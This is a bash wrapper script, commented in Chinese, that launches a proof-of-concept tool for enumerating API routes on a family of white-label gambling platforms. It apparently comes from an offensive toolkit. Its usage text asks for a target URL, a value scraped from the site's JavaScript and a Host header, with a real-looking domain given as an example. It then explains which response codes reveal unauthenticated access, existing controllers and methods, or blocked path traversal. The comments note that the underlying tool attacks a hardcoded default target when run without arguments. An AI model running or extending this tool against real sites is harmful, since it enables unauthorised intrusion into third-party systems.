#!/usr/bin/env bash
# entrance-api-错误码差分路由枚举器-bbin-系白牌盘口通用打法 — 参数守卫 wrapper
# 真正的实现在 entrance_route_oracle.py。这个 wrapper 存在的唯一原因：
#   entrance_route_oracle.py 用 sys.argv[n] if len>n else '<硬编码默认值>' 取参，
#   无参数时会直接对着默认目标发包。守卫必须在 shell 层。
set -uo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PY="$DIR/entrance_route_oracle.py"

if [ $# -lt 2 ]; then
  cat >&2 <<'EOF'
用法: ./poc.sh <BASE_URL> <ALIAS_B64> [HOST_HDR]

  BASE_URL   https://IP:PORT 或 https://HOST:PORT
  ALIAS_B64  从站点 JS 里抓到的 window.alias（base64 字符串）
  HOST_HDR   可选，形如 7h999.com:9900

判据: 响应 code 为空=可未授权 / 111034716=控制器不存在 /
      111034717=控制器存在方法不存在 / 111034714=路径穿越被拦
EOF
  exit 1
fi

if ! command -v python3 >/dev/null 2>&1; then
  printf '[-] 需要 python3\n' >&2; exit 1
fi
[ -f "$PY" ] || { printf '[-] 缺少实现文件: %s\n' "$PY" >&2; exit 1; }

exec python3 "$PY" "$@"
